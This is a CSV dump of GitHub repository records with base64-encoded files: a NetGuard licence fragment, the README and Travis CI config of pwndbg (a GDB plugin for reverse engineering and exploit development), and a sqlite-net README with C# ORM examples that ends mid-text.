bGljIExpY2Vuc2UKYWxvbmcgd2l0aCBOZXRHdWFyZC4gSWYgbm90LCBzZWUg
W2h0dHA6Ly93d3cuZ251Lm9yZy9saWNlbnNlcy9dKGh0dHA6Ly93d3cuZ251
Lm9yZy9saWNlbnNlcy8pLgoKVHJhZGVtYXJrcwotLS0tLS0tLS0tCgoqQW5k
cm9pZCBpcyBhIHRyYWRlbWFyayBvZiBHb29nbGUgSW5jLiBHb29nbGUgUGxh
eSBpcyBhIHRyYWRlbWFyayBvZiBHb29nbGUgSW5jKgo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'pwndbg',31181767,b'Exploit Development and Reverse Engineering with GDB Made Easy',b'Python',82,2384,,2384,False,b'https://api.github.com/repos/pwndbg/pwndbg/forks',"IyBwd25kYmcgWyFbQnVpbGQgU3RhdHVzXShodHRwczovL3RyYXZpcy1jaS5v
cmcvcHduZGJnL3B3bmRiZy5zdmc/YnJhbmNoPWRldildKGh0dHBzOi8vdHJh
dmlzLWNpLm9yZy9wd25kYmcvcHduZGJnKSBbIVtsaWNlbnNlXShodHRwczov
L2ltZy5zaGllbGRzLmlvL2dpdGh1Yi9saWNlbnNlL21hc2hhcGUvYXBpc3Rh
dHVzLnN2Zz9tYXhBZ2U9MjU5MjAwMCldKGh0dHBzOi8vZ2l0aHViLmNvbS9w
d25kYmcvcHduZGJnL2Jsb2IvZGV2L0xJQ0VOU0UubWQpIFshW1B5MiYzXSho
dHRwczovL2ltZy5zaGllbGRzLmlvL2JhZGdlL1B5dGhvbi0yJTIwJTI2JTIw
My1ncmVlbi5zdmcpXSgpIFshW0lSQ10oaHR0cHM6Ly9pbWcuc2hpZWxkcy5p
by9iYWRnZS9mcmVlbm9kZS0lMjNwd25kYmctcmVkLnN2ZyldKGh0dHBzOi8v
d2ViY2hhdC5mcmVlbm9kZS5uZXQvP2NoYW5uZWxzPSNwd25kYmcpCgpgcHdu
ZGJnYCAoL3BvyopuZGLDpmcvKSBpcyBhIEdEQiBwbHVnLWluIHRoYXQgbWFr
ZXMgZGVidWdnaW5nIHdpdGggR0RCIHN1Y2sgbGVzcywgd2l0aCBhIGZvY3Vz
IG9uIGZlYXR1cmVzIG5lZWRlZCBieSBsb3ctbGV2ZWwgc29mdHdhcmUgZGV2
ZWxvcGVycywgaGFyZHdhcmUgaGFja2VycywgcmV2ZXJzZS1lbmdpbmVlcnMg
YW5kIGV4cGxvaXQgZGV2ZWxvcGVycy4KCkl0IGhhcyBhIGJvYXRsb2FkIG9m
IGZlYXR1cmVzLCBzZWUgW0ZFQVRVUkVTLm1kXShGRUFUVVJFUy5tZCkuCgoj
IyBXaHk/CgpWYW5pbGxhIEdEQiBpcyB0ZXJyaWJsZSB0byB1c2UgZm9yIHJl
dmVyc2UgZW5naW5lZXJpbmcgYW5kIGV4cGxvaXQgZGV2ZWxvcG1lbnQuIFR5
cGluZyBgeC9nMzB4ICRlc3BgIGlzIG5vdCBmdW4sIGFuZCBkb2VzIG5vdCAg
Y29uZmVyIG11Y2ggaW5mb3JtYXRpb24uICBUaGUgeWVhciBpcyAyMDE5IGFu
ZCBHREIgc3RpbGwgbGFja3MgYSBoZXhkdW1wIGNvbW1hbmQhICBHREIncyBz
eW50YXggaXMgYXJjYW5lIGFuZCBkaWZmaWN1bHQgdG8gYXBwcm9hY2guICBX
aW5kYmcgdXNlcnMgYXJlIGNvbXBsZXRlbHkgbG9zdCB3aGVuIHRoZXkgb2Nj
YXNpb25hbGx5IG5lZWQgdG8gYnVtcCBpbnRvIEdEQi4KCiMjIFdoYXQ/CgpQ
d25kYmcgaXMgYSBQeXRob24gbW9kdWxlIHdoaWNoIGlzIGxvYWRlZCBkaXJl
Y3RseSBpbnRvIEdEQiwgYW5kIHByb3ZpZGVzIGEgc3VpdGUgb2YgdXRpbGl0
aWVzIGFuZCBjcnV0Y2hlcyB0byBoYWNrIGFyb3VuZCBhbGwgb2YgdGhlIGNy
dWZ0IHRoYXQgaXMgR0RCIGFuZCBzbW9vdGggb3V0IHRoZSByb3VnaCBlZGdl
cy4KCk1hbnkgb3RoZXIgcHJvamVjdHMgZnJvbSB0aGUgcGFzdCAoZS5nLiwg
W2dkYmluaXRdW2dkYmluaXRdLCBbUEVEQV1bUEVEQV0pIGFuZCBwcmVzZW50
IChlLmcuIFtHRUZdW0dFRl0pIGV4aXN0IHRvIGZpbGwgc29tZSB0aGVzZSBn
YXBzLiAgRWFjaCBwcm92aWRlcyBhbiBleGNlbGxlbnQgZXhwZXJpZW5jZSBh
bmQgZ3JlYXQgZmVhdHVyZXMgLS0gYnV0IHRoZXkncmUgZGlmZmljdWx0IHRv
IGV4dGVuZCAoc29tZSBhcmUgdW5tYWludGFpbmVkLCBhbmQgYWxsIGFyZSBh
IHNpbmdsZSBbMTAwS0JdW2dkYmluaXQyXSwgWzIwMEtCXVtwZWRhLnB5XSwg
b3IgWzMwMEtCXVtnZWYucHldIGZpbGUgKHJlc3BlY3RpdmVseSkpLgoKUHdu
ZGJnIGV4aXN0cyBub3Qgb25seSB0byByZXBsYWNlIGFsbCBvZiBpdHMgcHJl
ZGVjZXNzb3JzLCBidXQgYWxzbyB0byBoYXZlIGEgY2xlYW4gaW1wbGVtZW50
YXRpb24gdGhhdCBydW5zIHF1aWNrbHkgYW5kIGlzIHJlc2lsaWVudCBhZ2Fp
bnN0IGFsbCB0aGUgd2VpcmQgY29ybmVyIGNhc2VzIHRoYXQgY29tZSB1cC4K
CltnZGJpbml0XTogaHR0cHM6Ly9naXRodWIuY29tL2dkYmluaXQvR2RiaW5p
dApbZ2RiaW5pdDJdOiBodHRwczovL2dpdGh1Yi5jb20vZ2RiaW5pdC9HZGJp
bml0L2Jsb2IvbWFzdGVyL2dkYmluaXQKCltQRURBXTogaHR0cHM6Ly9naXRo
dWIuY29tL2xvbmdsZC9wZWRhCltwZWRhLnB5XTogaHR0cHM6Ly9naXRodWIu
Y29tL2xvbmdsZC9wZWRhL2Jsb2IvbWFzdGVyL3BlZGEucHkKCltHRUZdOiBo
dHRwczovL2dpdGh1Yi5jb20vaHVnc3kvZ2VmCltnZWYucHldOiBodHRwczov
L2dpdGh1Yi5jb20vaHVnc3kvZ2VmL2Jsb2IvbWFzdGVyL2dlZi5weQoKIyMg
SG93PwoKSW5zdGFsbGF0aW9uIGlzIHN0cmFpZ2h0Zm9yd2FyZC4gIFB3bmRi
ZyBpcyBiZXN0IHN1cHBvcnRlZCBvbiBVYnVudHUgMTQuMDQgd2l0aCBHREIg
Ny43LCBhbmQgVWJ1bnR1IDE2LjA0IHdpdGggR0RCIDcuMTEuICAKCmBgYHNo
ZWxsCmdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vcHduZGJnL3B3bmRi
ZwpjZCBwd25kYmcKLi9zZXR1cC5zaApgYGAKCklmIHlvdSB1c2UgYW55IG90
aGVyIExpbnV4IGRpc3RyaWJ1dGlvbiwgd2UgcmVjb21tZW5kIHVzaW5nIHRo
ZSBsYXRlc3QgYXZhaWxhYmxlIEdEQiBidWlsdCBmcm9tIHNvdXJjZS4gIEJl
IHN1cmUgdG8gcGFzcyBgLS13aXRoLXB5dGhvbj0vcGF0aC90by9weXRob25g
IHRvIGBjb25maWd1cmVgLgoKIyMgV2hhdCBjYW4gSSBkbyB3aXRoIHRoYXQ/
CgpGb3IgZnVydGhlciBpbmZvIGFib3V0IGZlYXR1cmVzL2Z1bmN0aW9uYWxp
dGllcywgc2VlIFtGRUFUVVJFU10oRkVBVFVSRVMubWQpLgoKIyMgV2hvPwoK
UHduZGJnIGlzIGFuIG9wZW4tc291cmNlIHByb2plY3QsIHdyaXR0ZW4gYW5k
IG1haW50YWluZWQgYnkgW21hbnkgY29udHJpYnV0b3JzXShodHRwczovL2dp
dGh1Yi5jb20vcHduZGJnL3B3bmRiZy9ncmFwaHMvY29udHJpYnV0b3JzKSEK
CldhbnQgdG8gaGVscCB3aXRoIGRldmVsb3BtZW50PyBSZWFkIFtDT05UUklC
VVRJTkddKC5naXRodWIvQ09OVFJJQlVUSU5HLm1kKS4KCiMjIENvbnRhY3QK
SWYgeW91IGhhdmUgYW55IHF1ZXN0aW9ucyBub3Qgd29ydGh5IG9mIGEgW2J1
ZyByZXBvcnRdKGh0dHBzOi8vZ2l0aHViLmNvbS9wd25kYmcvcHduZGJnL2lz
c3VlcyksIGZlZWwgZnJlZSB0byBwaW5nCltgZWJlaXA5MGAgb3IgYGRpc2Nv
bm5lY3QzZGAgYXQgI3B3bmRiZyBvbiBGcmVlbm9kZV0oaXJjOi8vaXJjLmZy
ZWVub2RlLm5ldC9wd25kYmcpIGFuZCBhc2sgYXdheS4KQ2xpY2sgW2hlcmVd
KGh0dHBzOi8va2l3aWlyYy5jb20vY2xpZW50L2lyYy5mcmVlbm9kZS5uZXQv
cHduZGJnKSB0byBjb25uZWN0Lgo=
",,"c3VkbzogcmVxdWlyZWQKZGlzdDogdHJ1c3R5Cmxhbmd1YWdlOiBweXRob24K
Y2FjaGU6CiAgICAtIHBpcAogICAgLSBkaXJlY3RvcmllczoKICAgICAgICAt
IC9ob21lL3RyYXZpcy92aXJ0dWFsZW52L3B5dGhvbjIuNy45L2xpYi9weXRo
b24yLjcvc2l0ZS1wYWNrYWdlcy8KICAgICAgICAtIC9ob21lL3RyYXZpcy92
aXJ0dWFsZW52L3B5dGhvbjIuNy45L2Jpbi8KICAgICAgICAtIGNhcHN0b25l
CiAgICAgICAgLSB1bmljb3JuCmluc3RhbGw6CiAgLSBzdWRvIGFwdC1nZXQg
LXkgaW5zdGFsbCBnZGIgbmFzbQogIC0gbHNiX3JlbGVhc2UgLWEKICAtIHBp
cCBpbnN0YWxsIC1yIHJlcXVpcmVtZW50cy50eHQKICAtIHN1ZG8gLi9zZXR1
cC5zaApzY3JpcHQ6CiAgLSBmdXR1cml6ZSAtLWFsbC1pbXBvcnRzIC0tc3Rh
Z2UxIC0tcHJpbnQtZnVuY3Rpb24gLS13cml0ZSAtLXVuaWNvZGUtbGl0ZXJh
bHMgcHduZGJnIHRlc3RzCiAgLSBnaXQgZGlmZi1pbmRleCAtLXF1aWV0IEhF
QUQgLS0gcHduZGJnIHRlc3RzCiAgLSBpc29ydCAtLWNoZWNrLW9ubHkgLS1k
aWZmIC0tcmVjdXJzaXZlIHB3bmRiZyB0ZXN0cwogIC0gUFdOREJHX1RSQVZJ
U19URVNUX1JVTj0xIC4vdGVzdHMuc2gKICAtIHB5dGhvbjIuNyAtbSBweV9j
b21waWxlIGlkYV9zY3JpcHQucHkgJChnaXQgbHMtZmlsZXMgJ3B3bmRiZy8q
LnB5JykKICAtIHB5dGhvbjMgICAtbSBweV9jb21waWxlICAgICAgICAgICAg
ICAgJChnaXQgbHMtZmlsZXMgJ3B3bmRiZy8qLnB5JykK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'sqlite-net',1666245,"b'Simple, powerful, cross-platform SQLite client and ORM for .NET'",b'C#',331,2384,,2384,False,b'https://api.github.com/repos/praeclarum/sqlite-net/forks',"CiMgU1FMaXRlLW5ldAoKWyFbQnVpbGQgU3RhdHVzXShodHRwczovL2FwcC5i
aXRyaXNlLmlvL2FwcC9iZjc1MmMyNmMzMWFlYzZjL3N0YXR1cy5zdmc/dG9r
ZW49cHVVLXlIaE1OZEF3SlV1c205c3dsQSZicmFuY2g9bWFzdGVyKV0oaHR0
cHM6Ly9hcHAuYml0cmlzZS5pby9hcHAvYmY3NTJjMjZjMzFhZWM2YykKClVz
ZSBvbmUgb2YgdGhlc2UgcGFja2FnZXM6Cgp8IFZlcnNpb24gfCBQYWNrYWdl
IHwgRGVzY3JpcHRpb24gfAp8IC0tLS0tLS0gfCAtLS0tLS0tIHwgLS0tLS0t
LS0tLS0gfAp8IFshW051R2V0IFBhY2thZ2VdKGh0dHBzOi8vaW1nLnNoaWVs
ZHMuaW8vbnVnZXQvdi9zcWxpdGUtbmV0LXBjbC5zdmcpXShodHRwczovL3d3
dy5udWdldC5vcmcvcGFja2FnZXMvc3FsaXRlLW5ldC1wY2wpIHwgW3NxbGl0
ZS1uZXQtcGNsXShodHRwczovL3d3dy5udWdldC5vcmcvcGFja2FnZXMvc3Fs
aXRlLW5ldC1wY2wpIHwgLk5FVCBTdGFuZGFyZCBMaWJyYXJ5IHwKfCBbIVtO
dUdldCBQYWNrYWdlIHdpdGggRW5jcnlwdGlvbl0oaHR0cHM6Ly9pbWcuc2hp
ZWxkcy5pby9udWdldC92L3NxbGl0ZS1uZXQtc3FsY2lwaGVyLnN2ZyldKGh0
dHBzOi8vd3d3Lm51Z2V0Lm9yZy9wYWNrYWdlcy9zcWxpdGUtbmV0LXNxbGNp
cGhlcikgfCBbc3FsaXRlLW5ldC1zcWxjaXBoZXJdKGh0dHBzOi8vd3d3Lm51
Z2V0Lm9yZy9wYWNrYWdlcy9zcWxpdGUtbmV0LXNxbGNpcGhlcikgfCBXaXRo
IEVuY3J5cHRpb24gU3VwcG9ydCB8CgpTUUxpdGUtbmV0IGlzIGFuIG9wZW4g
c291cmNlLCBtaW5pbWFsIGxpYnJhcnkgdG8gYWxsb3cgLk5FVCwgLk5FVCBD
b3JlLCBhbmQgTW9ubyBhcHBsaWNhdGlvbnMgdG8gc3RvcmUgZGF0YSBpbgpb
U1FMaXRlIDMgZGF0YWJhc2VzXShodHRwOi8vd3d3LnNxbGl0ZS5vcmcpLiBJ
dCB3YXMgZmlyc3QgZGVzaWduZWQgdG8gd29yayB3aXRoIFtYYW1hcmluLmlP
U10oaHR0cDovL3hhbWFyaW4uY29tKSwKYnV0IGhhcyBzaW5jZSBncm93biB1
cCB0byB3b3JrIG9uIGFsbCB0aGUgcGxhdGZvcm1zIChYYW1hcmluLiosIC5O
RVQsIFVXUCwgQXp1cmUsIGV0Yy4pLgoKU1FMaXRlLW5ldCB3YXMgZGVzaWdu
ZWQgYXMgYSBxdWljayBhbmQgY29udmVuaWVudCBkYXRhYmFzZSBsYXllci4g
SXRzIGRlc2lnbiBmb2xsb3dzIGZyb20gdGhlc2UgKmdvYWxzKjoKCiogVmVy
eSBlYXN5IHRvIGludGVncmF0ZSB3aXRoIGV4aXN0aW5nIHByb2plY3RzIGFu
ZCBydW5zIG9uIGFsbCB0aGUgLk5FVCBwbGF0Zm9ybXMuCiAgCiogVGhpbiB3
cmFwcGVyIG92ZXIgU1FMaXRlIHRoYXQgaXMgZmFzdCBhbmQgZWZmaWNpZW50
LiAoVGhpcyBsaWJyYXJ5IHNob3VsZCBub3QgYmUgdGhlIHBlcmZvcm1hbmNl
IGJvdHRsZW5lY2sgb2YgeW91ciBxdWVyaWVzLikKICAKKiBWZXJ5IHNpbXBs
ZSBtZXRob2RzIGZvciBleGVjdXRpbmcgQ1JVRCBvcGVyYXRpb25zIGFuZCBx
dWVyaWVzIHNhZmVseSAodXNpbmcgcGFyYW1ldGVycykgYW5kIGZvciByZXRy
aWV2aW5nIHRoZSByZXN1bHRzIG9mIHRob3NlIHF1ZXJ5IGluIGEgc3Ryb25n
bHkgdHlwZWQgZmFzaGlvbi4KICAKKiBXb3JrcyB3aXRoIHlvdXIgZGF0YSBt
b2RlbCB3aXRob3V0IGZvcmNpbmcgeW91IHRvIGNoYW5nZSB5b3VyIGNsYXNz
ZXMuIChDb250YWlucyBhIHNtYWxsIHJlZmxlY3Rpb24tZHJpdmVuIE9STSBs
YXllci4pCiAgCiMjIE51R2V0IEluc3RhbGxhdGlvbgoKSW5zdGFsbCBbc3Fs
aXRlLW5ldC1wY2xdKGh0dHBzOi8vd3d3Lm51Z2V0Lm9yZy9wYWNrYWdlcy9z
cWxpdGUtbmV0LXBjbCkgZnJvbSBOdUdldC4KCioqSW1wb3J0YW50OioqIFlv
dSB3aWxsIG5lZWQgdG8gYWRkIHRoZSBOdUdldCBwYWNrYWdlIHRvICoqYm90
aCoqIHlvdXIgKi5ORVQgU3RhbmRhcmQgbGlicmFyeSBwcm9qZWN0KiBhbmQg
eW91ciAqcGxhdGZvcm0tZGVwZW5kZW50IGFwcCBwcm9qZWN0Ki4KCiMjIFNv
dXJjZSBJbnN0YWxsYXRpb24KClNRTGl0ZS1uZXQgaXMgYWxsIGNvbnRhaW5l
ZCBpbiAxIGZpbGUgKEkga25vdywgc28gY29vbCByaWdodD8pIGFuZCBpcyBl
YXN5IHRvIGFkZCB0byB5b3VyIHByb2plY3QuIEp1c3QgYWRkIFtTUUxpdGUu
Y3NdKGh0dHBzOi8vZ2l0aHViLmNvbS9wcmFlY2xhcnVtL3NxbGl0ZS1uZXQv
YmxvYi9tYXN0ZXIvc3JjL1NRTGl0ZS5jcykgdG8geW91ciBwcm9qZWN0LCBh
bmQgeW91J3JlIHJlYWR5IHRvIHN0YXJ0IGNyZWF0aW5nIHRhYmxlcy4gCgoj
IyBQbGVhc2UgQ29udHJpYnV0ZSEKClRoaXMgaXMgYW4gb3BlbiBzb3VyY2Ug
cHJvamVjdCB0aGF0IHdlbGNvbWVzIGNvbnRyaWJ1dGlvbnMvc3VnZ2VzdGlv
bnMvYnVnIHJlcG9ydHMgZnJvbSB0aG9zZSB3aG8gdXNlIGl0LiBJZiB5b3Ug
aGF2ZSBhbnkgaWRlYXMgb24gaG93IHRvIGltcHJvdmUgdGhlIGxpYnJhcnks
IHBsZWFzZSBbcG9zdCBhbiBpc3N1ZSBoZXJlIG9uIEdpdEh1Yl0oaHR0cHM6
Ly9naXRodWIuY29tL3ByYWVjbGFydW0vc3FsaXRlLW5ldC9pc3N1ZXMpLiBQ
bGVhc2UgY2hlY2sgb3V0IHRoZSBbSG93IHRvIENvbnRyaWJ1dGVdKGh0dHBz
Oi8vZ2l0aHViLmNvbS9wcmFlY2xhcnVtL3NxbGl0ZS1uZXQvd2lraS9Ib3ct
dG8tQ29udHJpYnV0ZSkuCgoKIyBFeGFtcGxlIFRpbWUhCgpQbGVhc2UgY29u
c3VsdCB0aGUgV2lraSBmb3IsIGFoZW0sIFtjb21wbGV0ZSBkb2N1bWVudGF0
aW9uXShodHRwczovL2dpdGh1Yi5jb20vcHJhZWNsYXJ1bS9zcWxpdGUtbmV0
L3dpa2kpLgoKVGhlIGxpYnJhcnkgY29udGFpbnMgc2ltcGxlIGF0dHJpYnV0
ZXMgdGhhdCB5b3UgY2FuIHVzZSB0byBjb250cm9sIHRoZSBjb25zdHJ1Y3Rp
b24gb2YgdGFibGVzLiBJbiBhIHNpbXBsZSBzdG9jayBwcm9ncmFtLCB5b3Ug
bWlnaHQgdXNlOgoKYGBgY3NoYXJwCnB1YmxpYyBjbGFzcyBTdG9jawp7Cglb
UHJpbWFyeUtleSwgQXV0b0luY3JlbWVudF0KCXB1YmxpYyBpbnQgSWQgeyBn
ZXQ7IHNldDsgfQoJcHVibGljIHN0cmluZyBTeW1ib2wgeyBnZXQ7IHNldDsg
fQp9CgpwdWJsaWMgY2xhc3MgVmFsdWF0aW9uCnsKCVtQcmltYXJ5S2V5LCBB
dXRvSW5jcmVtZW50XQoJcHVibGljIGludCBJZCB7IGdldDsgc2V0OyB9Cglb
SW5kZXhlZF0KCXB1YmxpYyBpbnQgU3RvY2tJZCB7IGdldDsgc2V0OyB9Cglw
dWJsaWMgRGF0ZVRpbWUgVGltZSB7IGdldDsgc2V0OyB9CglwdWJsaWMgZGVj
aW1hbCBQcmljZSB7IGdldDsgc2V0OyB9Cn0KYGBgCgpPbmNlIHlvdSd2ZSBk
ZWZpbmVkIHRoZSBvYmplY3RzIGluIHlvdXIgbW9kZWwgeW91IGhhdmUgYSBj
aG9pY2Ugb2YgQVBJcy4gWW91IGNhbiB1c2UgdGhlICJzeW5jaHJvbm91cyBB
UEkiIHdoZXJlIGNhbGxzCmJsb2NrIG9uZSBhdCBhIHRpbWUsIG9yIHlvdSBj
YW4gdXNlIHRoZSAiYXN5bmNocm9ub3VzIEFQSSIgd2hlcmUgY2FsbHMgZG8g
bm90IGJsb2NrLiBZb3UgbWF5IGNhcmUgdG8gdXNlIHRoZSBhc3luY2hyb25v
dXMKQVBJIGZvciBtb2JpbGUgYXBwbGljYXRpb25zIGluIG9yZGVyIHRvIGlu
Y3JlYXNlIHJlc3BvbnNpdmVuZXNzLgoKQm90aCBBUElzIGFyZSBleHBsYWlu
ZWQgaW4gdGhlIHR3byBzZWN0aW9ucyBiZWxvdy4KCiMjIFN5bmNocm9ub3Vz
IEFQSQoKT25jZSB5b3UgaGF2ZSBkZWZpbmVkIHlvdXIgZW50aXR5LCB5b3Ug
Y2FuIGF1dG9tYXRpY2FsbHkgZ2VuZXJhdGUgdGFibGVzIGluIHlvdXIgZGF0
YWJhc2UgYnkgY2FsbGluZyBgQ3JlYXRlVGFibGVgOgoKYGBgY3NoYXJwCi8v
IEdldCBhbiBhYnNvbHV0ZSBwYXRoIHRvIHRoZSBkYXRhYmFzZSBmaWxlCnZh
ciBkYXRhYmFzZVBhdGggPSBQYXRoLkNvbWJpbmUoRW52aXJvbm1lbnQuR2V0
Rm9sZGVyUGF0aChFbnZpcm9ubWVudC5TcGVjaWFsRm9sZGVyLk15RG9jdW1l
bnRzKSwgIk15RGF0YS5kYiIpOwoKdmFyIGRiID0gbmV3IFNRTGl0ZUNvbm5l
Y3Rpb24oZGF0YWJhc2VQYXRoKTsKZGIuQ3JlYXRlVGFibGU8U3RvY2s+KCk7
CmRiLkNyZWF0ZVRhYmxlPFZhbHVhdGlvbj4oKTsKYGBgCgpZb3UgY2FuIGlu
c2VydCByb3dzIGluIHRoZSBkYXRhYmFzZSB1c2luZyBgSW5zZXJ0YC4gSWYg
dGhlIHRhYmxlIGNvbnRhaW5zIGFuIGF1dG8taW5jcmVtZW50ZWQgcHJpbWFy
eSBrZXksIHRoZW4gdGhlIHZhbHVlIGZvciB0aGF0IGtleSB3aWxsIGJlIGF2
YWlsYWJsZSB0byB5b3UgYWZ0ZXIgdGhlIGluc2VydDoKCmBgYGNzaGFycApw
dWJsaWMgc3RhdGljIHZvaWQgQWRkU3RvY2soU1FMaXRlQ29ubmVjdGlvbiBk
Yiwgc3RyaW5nIHN5bWJvbCkgewoJdmFyIHN0b2NrID0gbmV3IFN0b2NrKCkg
ewoJCVN5bWJvbCA9IHN5bWJvbAoJfTsKCWRiLkluc2VydChzdG9jayk7CglD
b25zb2xlLldyaXRlTGluZSgiezB9ID09IHsxfSIsIHN0b2NrLlN5bWJvbCwg
c3RvY2suSWQpOwp9CmBgYAoKU2ltaWxhciBtZXRob2RzIGV4aXN0IGZvciBg
VXBkYXRlYCBhbmQgYERlbGV0ZWAuCgpUaGUgbW9zdCBzdHJhaWdodGZvcndh
cmQgd2F5IHRvIHF1ZXJ5IGZvciBkYXRhIGlzIHVzaW5nIHRoZSBgVGFibGVg
IG1ldGhvZC4gVGhpcyBjYW4gdGFrZSBwcmVkaWNhdGVzIGZvciBjb25zdHJh
aW5pbmcgdmlhIFdIRVJFIGNsYXVzZXMgYW5kL29yIGFkZGluZyBPUkRFUiBC
WSBjbGF1c2VzOgoKYGBgY3NoYXJwCnZhciBxdWVyeSA9IGRiLlRhYmxlPFN0
b2NrPigpLldoZXJlKHYgPT4gdi5TeW1ib2wuU3RhcnRzV2l0aCgiQSIpKTsK
CmZvcmVhY2ggKHZhciBzdG9jayBpbiBxdWVyeSkKCUNvbnNvbGUuV3JpdGVM
aW5lKCJTdG9jazogIiArIHN0b2NrLlN5bWJvbCk7CmBgYAoKWW91IGNhbiBh
bHNvIHF1ZXJ5IHRoZSBkYXRhYmFzZSBhdCBhIGxvdy1sZXZlbCB1c2luZyB0
aGUgYFF1ZXJ5YCBtZXRob2Q6CgpgYGBjc2hhcnAKcHVibGljIHN0YXRpYyBJ
RW51bWVyYWJsZTxWYWx1YXRpb24+IFF1ZXJ5VmFsdWF0aW9ucyAoU1FMaXRl
Q29ubmVjdGlvbiBkYiwgU3RvY2sgc3RvY2spIHsKCXJldHVybiBkYi5RdWVy
eTxWYWx1YXRpb24+ICgic2VsZWN0ICogZnJvbSBWYWx1YXRpb24gd2hlcmUg
U3RvY2tJZCA9ID8iLCBzdG9jay5JZCk7Cn0KYGBgCgpUaGUgZ2VuZXJpYyBw
YXJhbWV0ZXIgdG8gdGhlIGBRdWVyeWAgbWV0aG9kIHNwZWNpZmllcyB0aGUg
dHlwZSBvZiBvYmplY3QgdG8gY3JlYXRlIGZvciBlYWNoIHJvdy4gSXQgY2Fu
IGJlIG9uZSBvZiB5b3VyIHRhYmxlIGNsYXNzZXMsIG9yIGFueSBvdGhlciBj
bGFzcyB3aG9zZSBwdWJsaWMgcHJvcGVydGllcyBtYXRjaCB0aGUgY29sdW1u
IHJldHVybmVkIGJ5IHRoZSBxdWVyeS4gRm9yIGluc3RhbmNlLCB3ZSBjb3Vs
ZCByZXdyaXRlIHRoZSBhYm92ZSBxdWVyeSBhczoKCmBgYGNzaGFycApwdWJs
aWMgY2xhc3MgVmFsCnsKCXB1YmxpYyBkZWNpbWFsIE1vbmV5IHsgZ2V0OyBz
ZXQ7IH0KCXB1YmxpYyBEYXRlVGltZSBEYXRlIHsgZ2V0OyBzZXQ7IH0KfQoK
cHVibGljIHN0YXRpYyBJRW51bWVyYWJsZTxWYWw+IFF1ZXJ5VmFscyAoU1FM
aXRlQ29ubmVjdGlvbiBkYiwgU3RvY2sgc3RvY2spIHsKCXJldHVybiBkYi5R
dWVyeTxWYWw+ICgic2VsZWN0IFwiUHJpY2VcIiBhcyBcIk1vbmV5XCIsIFwi
VGltZVwiIGFzIFwiRGF0ZVwiIGZyb20gVmFsdWF0aW9uIHdoZXJlIFN0b2Nr
SWQgPSA/Iiwgc3RvY2suSWQpOwp9CmBgYAoKWW91IGNhbiBwZXJmb3JtIGxv
dy1sZXZlbCB1cGRhdGVzIG9mIHRoZSBkYXRhYmFzZSB1c2luZyB0aGUgYEV4
ZWN1dGVgIG1ldGhvZC4KCiMjIEFzeW5jaHJvbm91cyBBUEkKClRoZSBhc3lu
Y2hyb25vdXMgbGlicmFyeSB1c2VzIHRoZSBUYXNrIFBhcmFsbGVsIExpYnJh
cnkgKFRQTCkuIEFzIHN1Y2gsIG5vcm1hbCB1c2Ugb2YgYFRhc2tgIG9iamVj
dHMsIGFuZCB0aGUgYGFzeW5jYCBhbmQgYGF3YWl0YCBrZXl3b3JkcyAKd2ls
bCB3b3JrIGZvciB5b3UuCgpPbmNlIHlvdSBoYXZlIGRlZmluZWQgeW91ciBl
bnRpdHksIHlvdSBjYW4gYXV0b21hdGljYWxseSBnZW5lcmF0ZSB0YWJsZXMg
YnkgY2FsbGluZyBgQ3JlYXRlVGFibGVBc3luY2A6CgpgYGBjc2hhcnAKLy8g
R2V0IGFuIGFic29sdXRlIHBhdGggdG8gdGhlIGRhdGFiYXNlIGZpbGUKdmFy
IGRhdGFiYXNlUGF0aCA9IFBhdGguQ29tYmluZShFbnZpcm9ubWVudC5HZXRG
b2xkZXJQYXRoKEVudmlyb25tZW50LlNwZWNpYWxGb2xkZXIuTXlEb2N1bWVu
dHMpLCAiTXlEYXRhLmRiIik7Cgp2YXIgZGIgPSBuZXcgU1FMaXRlQXN5bmND
b25uZWN0aW9uKGRhdGFiYXNlUGF0aCk7Cgphd2FpdCBkYi5DcmVhdGVUYWJs
ZUFzeW5jPFN0b2NrPigpOwoKQ29uc29sZS5Xcml0ZUxpbmUoIlRhYmxlIGNy
ZWF0ZWQhIik7CmBgYAoKWW91IGNhbiBpbnNlcnQgcm93cyBpbiB0aGUgZGF0
YWJhc2UgdXNpbmcgYEluc2VydGAuIElmIHRoZSB0YWJsZSBjb250YWlucyBh
biBhdXRvLWluY3JlbWVudGVkIHByaW1hcnkga2V5LCB0aGVuIHRoZSB2YWx1
ZSBmb3IgdGhhdCBrZXkgd2lsbCBiZSBhdmFpbGFibGUgdG8geW91IGFmdGVy
IHRoZSBpbnNlcnQ6CgpgYGBjc2hhcnAKdmFyIHN0b2NrID0gbmV3IFN0b2Nr
KCkKewoJU3ltYm9sID0gIkFBUEwiCn07Cgphd2FpdCBkYi5JbnNlcnRBc3lu
YyhzdG9jayk7CgpDb25zb2xlLldyaXRlTGluZSgiQXV0byBzdG9jayBpZDog
ezB9Iiwgc3RvY2suSWQpOwpgYGAKClNpbWlsYXIgbWV0aG9kcyBleGlzdCBm
b3IgYFVwZGF0ZUFzeW5jYCBhbmQgYERlbGV0ZUFzeW5jYC4KClF1ZXJ5aW5n
IGZvciBkYXRhIGlzIG1vc3Qgc3RyYWlnaHRmb3J3YXJkbHkgZG9uZSB1c2lu
ZyB0aGUgYFRhYmxlYCBtZXRob2QuIFRoaXMgd2lsbCByZXR1cm4gYW4gYEFz
eW5jVGFibGVRdWVyeWAgaW5zdGFuY2UgYmFjaywgd2hlcmV1cG9uCnlvdSBj
YW4gYWRkIHByZWRpY2F0ZXMgZm9yIGNvbnN0cmFpbmluZyB2aWEgV0hFUkUg
Y2xhdXNlcyBhbmQvb3IgYWRkaW5nIE9SREVSIEJZLiBUaGUgZGF0YWJhc2Ug
